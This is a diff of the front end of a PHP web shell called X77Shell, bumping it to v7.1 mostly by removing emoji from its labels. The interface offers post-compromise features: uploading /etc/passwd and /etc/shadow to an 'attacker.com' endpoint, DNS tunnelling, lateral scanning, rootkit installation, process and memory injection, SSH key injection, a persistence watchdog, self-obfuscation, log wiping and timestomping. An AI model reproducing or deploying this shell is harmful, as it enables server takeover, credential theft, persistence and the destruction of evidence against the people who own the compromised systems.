-    <button class="tb2" onclick="advDNS()">🌐 DNS Tunnel</button>
+    <button class="tb2" onclick="advDNS()">DNS Tunnel</button>
     </div>
     <div style="display:flex;gap:3px;margin-top:3px">
     <input class="ti" id="adv-fragd" placeholder="Data" style="flex:1;font-size:9px;padding:2px 4px" value="test">
     <input class="ti" id="adv-fragsz" placeholder="Size" style="width:50px;font-size:9px;padding:2px 4px" value="100">
-    <button class="tb2" onclick="advFragment()">🧩 Fragment</button>
+    <button class="tb2" onclick="advFragment()">Fragment</button>
     </div>
     <div class="rbox" id="adv-resilience-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
     </div>
     <!-- Lateral -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:var(--p);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">🔀 Lateral</div>
-    <button class="tb2" onclick="advAct('adv_lateral_harvest')">🌾 Harvest</button>
+    <div style="color:var(--p);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Lateral</div>
+    <button class="tb2" onclick="advAct('adv_lateral_harvest')">Harvest</button>
     <div style="display:flex;gap:3px;margin-top:3px">
     <input class="ti" id="adv-snet" placeholder="192.168.1.0/24" style="flex:1;font-size:9px;padding:2px 4px" value="192.168.1.0/24">
-    <button class="tb2" onclick="advScan()">🔍 Scan</button>
+    <button class="tb2" onclick="advScan()">Scan</button>
     </div>
     <div class="rbox" id="adv-lateral-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
     </div>
     <!-- Cleanup -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:var(--d);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">🧹 Cleanup</div>
-    <button class="tb2" onclick="advAct('adv_cleanup_logs')">📋 Logs</button>
-    <button class="tb2" onclick="advAct('adv_cleanup_history')">📜 History</button>
+    <div style="color:var(--d);font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Cleanup</div>
+    <button class="tb2" onclick="advAct('adv_cleanup_logs')">Logs</button>
+    <button class="tb2" onclick="advAct('adv_cleanup_history')">History</button>
     <div style="display:flex;gap:3px;margin-top:3px">
     <input class="ti" id="adv-cf" placeholder="/path/to/file" style="flex:1;font-size:9px;padding:2px 4px">
-    <button class="tb2" onclick="advCleanFile()">🗑️ Remove</button>
+    <button class="tb2" onclick="advCleanFile()">Remove</button>
     </div>
     <div class="rbox" id="adv-cleanup-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
     </div>
     <!-- System Monitoring -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#38bdf8;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">📊 System Monitor</div>
-    <button class="tb2" onclick="doSysmon()">🔄 Refresh Stats</button>
+    <div style="color:#38bdf8;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">System Monitor</div>
+    <button class="tb2" onclick="doSysmon()">Refresh Stats</button>
     <div class="rbox" id="sysmon-out" style="font-size:8px;max-height:200px;min-height:40px;white-space:pre-wrap">Click to load system data.</div>
     </div>
     <!-- Cloud Sync -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#34d399;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">☁️ Cloud Sync</div>
+    <div style="color:#34d399;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Cloud Sync</div>
     <div style="display:flex;gap:3px;flex-wrap:wrap">
     <input class="ti" id="sync-paths" placeholder="/etc/passwd,/etc/shadow" style="flex:1;font-size:9px;padding:2px 4px" value="/etc/passwd,/etc/shadow">
     <input class="ti" id="sync-url" placeholder="https://attacker.com/upload.php" style="flex:1;font-size:9px;padding:2px 4px">
     </div>
-    <button class="tb2" onclick="doSyncCloud()">⬆ Upload</button>
+    <button class="tb2" onclick="doSyncCloud()">Upload</button>
     <div class="rbox" id="sync-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
     </div>
     <!-- Process Injection -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#f472b6;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">💉 Process Injection</div>
+    <div style="color:#f472b6;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Process Injection</div>
     <div style="display:flex;gap:3px;flex-wrap:wrap">
     <input class="ti" id="inj-pid" placeholder="PID" style="width:60px;font-size:9px;padding:2px 4px" value="1">
     <input class="ti" id="inj-cmd" placeholder="command" style="flex:1;font-size:9px;padding:2px 4px" value="id">
-    <button class="tb2" onclick="doProcessInject()">💉 Inject</button>
+    <button class="tb2" onclick="doProcessInject()">Inject</button>
     </div>
     <div class="rbox" id="inj-out" style="font-size:8px;max-height:60px;min-height:20px">-</div>
     </div>
     <!-- Self Destruct -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#f87171;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">💣 Self Destruct</div>
+    <div style="color:#f87171;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Self Destruct</div>
     <div style="display:flex;gap:3px;flex-wrap:wrap">
-    <button class="tb2" style="border-color:var(--d);color:var(--d);font-weight:700" onclick="doSelfDestruct()">💀 NUKE & DELETE</button>
+    <button class="tb2" style="border-color:var(--d);color:var(--d);font-weight:700" onclick="doSelfDestruct()">NUKE & DELETE</button>
     </div>
     <div style="font-size:7px;color:var(--dim);margin-top:2px">⚠️ Will delete shell file + clear all logs</div>
     <div class="rbox" id="sd-out" style="font-size:8px;max-height:30px;min-height:15px">-</div>
     </div>
     <!-- Rootkit -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#c084fc;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">👾 Rootkit</div>
-    <button class="tb2" onclick="doRootkitInstall()">🔧 Install Full Rootkit</button>
+    <div style="color:#c084fc;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Rootkit</div>
+    <button class="tb2" onclick="doRootkitInstall()">Install Full Rootkit</button>
     <div style="display:flex;gap:3px;margin-top:3px;flex-wrap:wrap">
     <input class="ti" id="rk-path" placeholder="/path/to/file" style="flex:1;font-size:9px;padding:2px 4px" value="<?=__FILE__?>">
-    <button class="tb2" onclick="doRootkitHideFile()">👻 Hide + Lock</button>
+    <button class="tb2" onclick="doRootkitHideFile()">Hide + Lock</button>
     </div>
     <div style="display:flex;gap:3px;margin-top:3px;flex-wrap:wrap">
     <input class="ti" id="rk-kill" placeholder="process name" style="flex:1;font-size:9px;padding:2px 4px" value="tcpdump">
-    <button class="tb2" onclick="doRootkitKill()">🔪 Kill</button>
+    <button class="tb2" onclick="doRootkitKill()">Kill</button>
     </div>
     <div class="rbox" id="rk-out" style="font-size:8px;max-height:80px;min-height:20px">-</div>
     </div>
-    <!-- =================== UPGRADE: Auto Privesc =================== -->
+    <!-- Auto Privesc -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#facc15;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">⬆️ Auto Privesc</div>
-    <button class="tb2" onclick="doPrivesc()">🔍 Scan Vectors</button>
+    <div style="color:#facc15;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Auto Privesc</div>
+    <button class="tb2" onclick="doPrivesc()">Scan Vectors</button>
     <div class="rbox" id="privesc-out" style="font-size:8px;max-height:140px;min-height:30px;white-space:pre-wrap">Click to scan SUID, Sudo, Cron, .env</div>
     </div>
-    <!-- =================== UPGRADE: Persistence Auto-Heal ========== -->
+    <!-- Watchdog -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#f472b6;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">🔄 Auto-Heal Watchdog</div>
-    <button class="tb2" onclick="doWatchdog()">🛡️ Install Watchdog</button>
+    <div style="color:#f472b6;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Auto-Heal Watchdog</div>
+    <button class="tb2" onclick="doWatchdog()">Install Watchdog</button>
     <div class="rbox" id="watchdog-out" style="font-size:8px;max-height:50px;min-height:20px">-</div>
     </div>
-    <!-- =================== UPGRADE: Memory Payload ================== -->
+    <!-- Memory Payload -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#22d3ee;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">🧠 Memory Payload</div>
+    <div style="color:#22d3ee;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Memory Payload</div>
     <div style="display:flex;gap:3px;flex-wrap:wrap">
     <textarea class="ti" id="mem-payload" placeholder="base64 payload or raw script" style="flex:1;font-size:8px;padding:2px 4px;height:40px;resize:vertical"></textarea>
     </div>
     <div style="display:flex;gap:3px;flex-wrap:wrap;margin-top:3px">
     <input class="ti" id="mem-cmd" placeholder="Direct command (optional)" style="flex:1;font-size:9px;padding:2px 4px">
-    <button class="tb2" onclick="doMemoryPayload()">💉 Inject Memory</button>
+    <button class="tb2" onclick="doMemoryPayload()">Inject Memory</button>
     </div>
     <div class="rbox" id="mem-out" style="font-size:8px;max-height:40px;min-height:15px">-</div>
     </div>
-    <!-- =================== UPGRADE: Self-Obfuscator ================= -->
+    <!-- Obfuscator -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#a78bfa;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">📝 Self-Obfuscator</div>
-    <button class="tb2" onclick="doObfuscate()">🔐 Obfuscate This Shell</button>
+    <div style="color:#a78bfa;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Self-Obfuscator</div>
+    <button class="tb2" onclick="doObfuscate()">Obfuscate This Shell</button>
     <div class="rbox" id="obf-out" style="font-size:8px;max-height:50px;min-height:15px">-</div>
     </div>
-    <!-- =================== UPGRADE: Log Timestomp =================== -->
+    <!-- Timestomp -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#f59e0b;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">🕐 Log Timestomp</div>
+    <div style="color:#f59e0b;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">Log Timestomp</div>
     <div style="display:flex;gap:3px;flex-wrap:wrap">
     <input class="ti" id="ts-log" placeholder="/var/log/apache2/access.log" style="flex:1;font-size:9px;padding:2px 4px" value="/var/log/apache2/access.log">
     <input class="ti" id="ts-ref" placeholder="/etc/passwd" style="flex:1;font-size:9px;padding:2px 4px" value="/etc/passwd">
     </div>
-    <button class="tb2" onclick="doTimestomp()">⏳ Stomp Timestamp</button>
+    <button class="tb2" onclick="doTimestomp()">Stomp Timestamp</button>
     <div class="rbox" id="ts-out" style="font-size:8px;max-height:40px;min-height:15px">-</div>
     </div>
-    <!-- =================== UPGRADE: SSH Key Inject ================== -->
+    <!-- SSH Key Inject -->
     <div style="background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px">
-    <div style="color:#34d399;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">🔑 SSH Key Inject</div>
+    <div style="color:#34d399;font-weight:700;font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b);padding-bottom:4px;margin-bottom:6px">SSH Key Inject</div>
     <textarea class="ti" id="ssh-key" placeholder="ssh-rsa AAAAB3NzaC1yc2EAAA..." style="font-size:8px;padding:2px 4px;height:50px;resize:vertical"></textarea>
-    <button class="tb2" onclick="doSSHInject()">⬆ Inject SSH Key</button>
+    <button class="tb2" onclick="doSSHInject()">Inject SSH Key</button>
     <div class="rbox" id="ssh-out" style="font-size:8px;max-height:40px;min-height:15px">-</div>
     </div>
     </div>
@@ -1608,7 +1606,7 @@ if (empty($_SESSION['auth'])) {
     <div class="sb-sec">🔒 CSRF+RL+FP+REGEN</div>
     <div style="flex:1"></div>
     <div class="sb-item">IP: <b><?=esc($_SERVER['REMOTE_ADDR'])?></b></div>
-    <div class="sb-item">X77Shell v7+</div>
+    <div class="sb-item">X77Shell v7.1</div>
     </div>
     </div>
     <div id="ac"></div>
@@ -1617,11 +1615,11 @@ if (empty($_SESSION['auth'])) {
     <div id="ed-modal">
     <div id="ed-bar">
     <span id="ed-name">-</span><span id="ed-status"></span><span id="ed-autosave" style="font-size:8px;color:var(--a3)"></span>
-    <button class="tb2" style="font-size:8px" onclick="toggleFR()">⇄ Find</button>
-    <button class="tb2" style="font-size:8px" onclick="toggleGoto()">→ Line</button>
-    <button class="tb2" style="font-size:8px" onclick="edCloseTab()">✕ Tab</button>
-    <button class="tb2" style="font-size:8px" onclick="closeOv('ed-ov')">✕ Close</button>
-    <button class="tb2" style="font-size:8px;border-color:var(--a3);color:var(--a3)" onclick="saveFile()">💾 Save</button>
+    <button class="tb2" style="font-size:8px" onclick="toggleFR()">Find</button>
+    <button class="tb2" style="font-size:8px" onclick="toggleGoto()">Line</button>
+    <button class="tb2" style="font-size:8px" onclick="edCloseTab()">Close Tab</button>
+    <button class="tb2" style="font-size:8px" onclick="closeOv('ed-ov')">Close</button>
+    <button class="tb2" style="font-size:8px;border-color:var(--a3);color:var(--a3)" onclick="saveFile()">Save</button>
     </div>
     <div id="ed-tabs"></div>
     <div id="ed-fr">
@@ -1641,7 +1639,7 @@ if (empty($_SESSION['auth'])) {
     <!-- Chmod -->
     <div class="overlay" id="chmod-ov">
     <div class="modal">
-    <h2>🔒 Chmod</h2>
+    <h2>Chmod</h2>
     <div class="tf"><label>File</label><input class="ti" id="ch-f" readonly></div>
     <div class="tf"><label>Mode</label>
     <select class="ti" id="ch-m">
@@ -1656,7 +1654,7 @@ if (empty($_SESSION['auth'])) {
     <!-- Rename -->
     <div class="overlay" id="rename-ov">
     <div class="modal">
-    <h2>✏️ Rename</h2>
+    <h2>Rename</h2>
     <div class="tf"><label>Nama Baru</label><input class="ti" id="rn-n" placeholder="filename.ext" onkeydown="if(event.key==='Enter')doRename()"></div>
     <div class="mrow"><button class="tb2" onclick="closeOv('rename-ov')">Batal</button><button class="tb2" style="border-color:var(--a3);color:var(--a3)" onclick="doRename()">Rename</button></div>
     </div>
@@ -1664,7 +1662,7 @@ if (empty($_SESSION['auth'])) {
     <!-- Upload -->
     <div class="overlay" id="upload-ov">
     <div class="modal">
-    <h2>⬆ Upload</h2>
+    <h2>Upload</h2>
     <div id="dz" onclick="document.getElementById('up-f').click()" ondragover="event.preventDefault();this.classList.add('drag')" ondragleave="this.classList.remove('drag')" ondrop="handleDrop(event)">
     <input type="file" id="up-f" multiple onchange="doUpload()">
     <div>🗂 Drag & drop or click</div>
@@ -1675,19 +1673,19 @@ if (empty($_SESSION['auth'])) {
     </div>
     <!-- Command Palette -->
     <div id="palette" style="display:none;position:fixed;top:15%;left:50%;transform:translateX(-50%);background:var(--s);border:1px solid var(--a);border-radius:10px;padding:12px;z-index:950;min-width:420px;max-width:92vw;box-shadow:0 16px 50px rgba(0,0,0,.7);backdrop-filter:blur(10px)">
-    <div style="font-size:8px;color:var(--dim);letter-spacing:.1em;margin-bottom:8px;font-family:'Space Grotesk',sans-serif;font-weight:700;text-transform:uppercase">⌨️ Command Palette</div>
+    <div style="font-size:8px;color:var(--dim);letter-spacing:.1em;margin-bottom:8px;font-family:'Space Grotesk',sans-serif;font-weight:700;text-transform:uppercase">Command Palette</div>
     <input id="pal-in" style="width:100%;background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:11px;padding:7px 9px;border-radius:5px;outline:none;transition:border-color .2s" placeholder="search command or type...">
     <div id="pal-res" style="margin-top:6px;max-height:230px;overflow-y:auto;display:flex;flex-direction:column;gap:2px"></div>
     </div>
     <!-- History Search -->
     <div id="hist-srch" style="display:none;position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:var(--s2);border:1px solid var(--a);border-radius:8px;padding:10px;z-index:900;min-width:370px;box-shadow:0 8px 30px rgba(0,0,0,.6)">
-    <div style="font-size:8px;color:var(--dim);letter-spacing:.1em;margin-bottom:6px">⌛ HISTORY SEARCH (ESC to close)</div>
+    <div style="font-size:8px;color:var(--dim);letter-spacing:.1em;margin-bottom:6px">HISTORY SEARCH (ESC to close)</div>
     <input id="hs-in" style="width:100%;background:var(--s3);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:11px;padding:5px 8px;border-radius:4px;outline:none" placeholder="search...">
     <div id="hs-res" style="margin-top:5px;max-height:150px;overflow-y:auto"></div>
     </div>
     <!-- Multiline -->
     <div id="ml-ov" style="display:none;position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:var(--s);border:1px solid var(--a);border-radius:8px;padding:12px;z-index:900;min-width:420px;max-width:90vw;box-shadow:0 8px 30px rgba(0,0,0,.6)">
-    <div style="font-size:8px;color:var(--dim);margin-bottom:7px">📝 MULTI-LINE (Ctrl+Enter = run, Esc = close)</div>
+    <div style="font-size:8px;color:var(--dim);margin-bottom:7px">MULTI-LINE (Ctrl+Enter = run, Esc = close)</div>
     <textarea id="ml-in" style="width:100%;height:110px;background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:10.5px;padding:7px;border-radius:5px;outline:none;resize:vertical;tab-size:4" placeholder="Commands, one per line..."></textarea>
     <div style="display:flex;gap:6px;margin-top:7px">
     <button onclick="closeML()" style="flex:1;background:transparent;border:1px solid var(--b);color:var(--dim);font-family:'JetBrains Mono',monospace;font-size:9px;padding:5px;border-radius:4px;cursor:pointer">Close</button>
@@ -1936,26 +1934,26 @@ if (empty($_SESSION['auth'])) {
         function pickHS(cmd){document.getElementById('cmd'+hsPaneCtx).value=cmd;closeHS();}
         (()=>{const i=document.getElementById('hs-in');if(i){i.addEventListener('input',e=>renderHS(e.target.value));i.addEventListener('keydown',e=>{if(e.key==='Escape')closeHS();if(e.key==='Enter'){const f=document.getElementById('hs-res').querySelector('div');if(f)f.click();}});}})();
         const PAL_CMDS=[
-            {l:'⌧ Clear terminal',a:()=>clearTerm(1)},{l:'🔍 Search output',a:()=>toggleSrch(1)},
-            {l:'⚡ Filter output',a:()=>openFilter(1)},{l:'⊟ Toggle split',a:()=>toggleSplit()},
-            {l:'📋 Show history',a:()=>{document.getElementById('cmd1').value='history';runCmd(1);}},
-            {l:'💾 Disk usage',a:()=>{document.getElementById('cmd1').value='df -h';runCmd(1);}},
-            {l:'🧠 Memory usage',a:()=>{document.getElementById('cmd1').value='free -m';runCmd(1);}},
-            {l:'⚙️ Processes',a:()=>{document.getElementById('cmd1').value='ps aux';runCmd(1);}},
-            {l:'🌐 Network',a:()=>{document.getElementById('cmd1').value='ifconfig 2>/dev/null||ip addr';runCmd(1);}},
-            {l:'📡 Listening ports',a:()=>{document.getElementById('cmd1').value='ss -tlnp 2>/dev/null||netstat -tlnp';runCmd(1);}},
-            {l:'👤 Current user',a:()=>{document.getElementById('cmd1').value='id';runCmd(1);}},
-            {l:'🐘 PHP version',a:()=>{document.getElementById('cmd1').value='php -v';runCmd(1);}},
-            {l:'📂 List dir',a:()=>{document.getElementById('cmd1').value='ls -la';runCmd(1);}},
-            {l:'⬆️ Parent dir',a:()=>{document.getElementById('cmd1').value='cd ..';runCmd(1);}},
-            {l:'⬅️ Dir back',a:()=>cwdBack()},{l:'➡️ Dir forward',a:()=>cwdFwd()},
-            {l:'🔄 Refresh files',a:()=>fmLoad(fmDir)},
-            {l:'🛡 Security tools',a:()=>{document.querySelectorAll('.nb,.panel').forEach(e=>e.classList.remove('on'));document.getElementById('panel-security').classList.add('on');}},
-            {l:'🔎 CVE lookup',a:()=>{document.querySelectorAll('.nb,.panel').forEach(e=>e.classList.remove('on'));document.getElementById('panel-cve').classList.add('on');}},
-            {l:'✅ PHP Security Checklist',a:()=>doSecCL()},
-            {l:'🆕 CVE terbaru',a:()=>{cveTab('recent',null);doCVER();}},
-            {l:'⛶ Fullscreen terminal',a:()=>toggleFS('panel-terminal')},
-            {l:'🕐 Uptime',a:()=>{document.getElementById('cmd1').value='uptime';runCmd(1);}},
+            {l:'Clear terminal',a:()=>clearTerm(1)},{l:'Search output',a:()=>toggleSrch(1)},
+            {l:'Filter output',a:()=>openFilter(1)},{l:'Toggle split',a:()=>toggleSplit()},
+            {l:'Show history',a:()=>{document.getElementById('cmd1').value='history';runCmd(1);}},
+            {l:'Disk usage',a:()=>{document.getElementById('cmd1').value='df -h';runCmd(1);}},
+            {l:'Memory usage',a:()=>{document.getElementById('cmd1').value='free -m';runCmd(1);}},
+            {l:'Processes',a:()=>{document.getElementById('cmd1').value='ps aux';runCmd(1);}},
+            {l:'Network',a:()=>{document.getElementById('cmd1').value='ifconfig 2>/dev/null||ip addr';runCmd(1);}},
+            {l:'Listening ports',a:()=>{document.getElementById('cmd1').value='ss -tlnp 2>/dev/null||netstat -tlnp';runCmd(1);}},
+            {l:'Current user',a:()=>{document.getElementById('cmd1').value='id';runCmd(1);}},
+            {l:'PHP version',a:()=>{document.getElementById('cmd1').value='php -v';runCmd(1);}},
+            {l:'List dir',a:()=>{document.getElementById('cmd1').value='ls -la';runCmd(1);}},
+            {l:'Parent dir',a:()=>{document.getElementById('cmd1').value='cd ..';runCmd(1);}},
+            {l:'Dir back',a:()=>cwdBack()},{l:'Dir forward',a:()=>cwdFwd()},
+            {l:'Refresh files',a:()=>fmLoad(fmDir)},
+            {l:'Security tools',a:()=>{document.querySelectorAll('.nb,.panel').forEach(e=>e.classList.remove('on'));document.getElementById('panel-security').classList.add('on');}},
+            {l:'CVE lookup',a:()=>{document.querySelectorAll('.nb,.panel').forEach(e=>e.classList.remove('on'));document.getElementById('panel-cve').classList.add('on');}},
+            {l:'PHP Security Checklist',a:()=>doSecCL()},
+            {l:'CVE terbaru',a:()=>{cveTab('recent',null);doCVER();}},
+            {l:'Fullscreen terminal',a:()=>toggleFS('panel-terminal')},
+            {l:'Uptime',a:()=>{document.getElementById('cmd1').value='uptime';runCmd(1);}},
         ];
         let palCtx=1;
         function openPalette(pane=1){palCtx=pane;const p=document.getElementById('palette');p.style.display='block';const pi=document.getElementById('pal-in');pi.value='';pi.focus();renderPal('');}
@@ -2000,17 +1998,17 @@ if (empty($_SESSION['auth'])) {
                 const prev=isImg&&fmView==='list'?`<img class="fmi-prev" src="${esc(full)}" loading="lazy" onerror="this.style.display='none'">`:'';
             const gPrev=isImg&&fmView==='grid'?`<img style="width:44px;height:44px;object-fit:cover;border-radius:2px;border:1px solid var(--b)" src="${esc(full)}" loading="lazy" onerror="this.style.display='none'">`:'';
             const acts=`<div style="display:flex;gap:1px">
-            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();openEd('${fE}','${nE}')" title="Edit">📝</button>`:''}
-            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmClone('${fE}')" title="Clone">📋</button>`:''}
-            <button class="fma" onclick="event.stopPropagation();openRename('${fE}','${nE}')" title="Rename">✏️</button>
-            <button class="fma lk" onclick="event.stopPropagation();fmC775('${fE}')" title="chmod 775">🔒</button>
-            <button class="fma lk" onclick="event.stopPropagation();fmC444('${fE}')" title="chmod 444">🔏</button>
-            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmZip('${fE}')" title="Zip">📦</button>`:''}
-            ${item.ext==='zip'?`<button class="fma" onclick="event.stopPropagation();fmUnzip('${fE}')" title="Unzip">📂</button>`:''}
-            ${isTxt?`<button class="fma" onclick="event.stopPropagation();fmPrev('${fE}')" title="Preview">👁</button>`:''}
-            <button class="fma" onclick="event.stopPropagation();copyPath('${fE}')" title="Copy path">🔗</button>
-            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmDl('${fE}','${nE}')" title="Download">⬇</button>`:''}
-            <button class="fma del" onclick="event.stopPropagation();fmDel('${fE}','${nE}')" title="Delete">🗑</button>
+            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();openEd('${fE}','${nE}')" title="Edit">Edit</button>`:''}
+            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmClone('${fE}')" title="Clone">Clone</button>`:''}
+            <button class="fma" onclick="event.stopPropagation();openRename('${fE}','${nE}')" title="Rename">Rename</button>
+            <button class="fma lk" onclick="event.stopPropagation();fmC775('${fE}')" title="Lock 775">Lock</button>
+            <button class="fma lk" onclick="event.stopPropagation();fmC444('${fE}')" title="Lock 444">Lock 444</button>
+            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmZip('${fE}')" title="Zip">Zip</button>`:''}
+            ${item.ext==='zip'?`<button class="fma" onclick="event.stopPropagation();fmUnzip('${fE}')" title="Unzip">Unzip</button>`:''}
+            ${isTxt?`<button class="fma" onclick="event.stopPropagation();fmPrev('${fE}')" title="Preview">Preview</button>`:''}
+            <button class="fma" onclick="event.stopPropagation();copyPath('${fE}')" title="Copy path">Copy</button>
+            ${item.type==='file'?`<button class="fma" onclick="event.stopPropagation();fmDl('${fE}','${nE}')" title="Download">Download</button>`:''}
+            <button class="fma del" onclick="event.stopPropagation();fmDel('${fE}','${nE}')" title="Delete">Delete</button>
             </div>`;
             if(fmView==='grid')return`<div class="fmi grid-item ${item.type==='dir'?'fmi-dir':''}" onclick="fmClick('${fmDir}','${nE}','${item.type}')">${gPrev||`<span class="fmi-icon">${icon}</span>`}<span class="fmi-name">${esc(item.name)}</span>${acts}</div>`;
             return`<div class="fmi ${item.type==='dir'?'fmi-dir':''} ${selFiles.has(full)?'sel':''}" onclick="fmClick('${fmDir}','${nE}','${item.type}')">
@@ -2357,7 +2355,7 @@ if (empty($_SESSION['auth'])) {
             const pr=await post({action:'get_pins'});renderPins(pr.pins||[]);
         })();
 
-        console.log('[X77Shell v7+] All modules loaded');
+        console.log('[X77Shell v7.1] All modules loaded');
         </script>
         </body>
         </html>
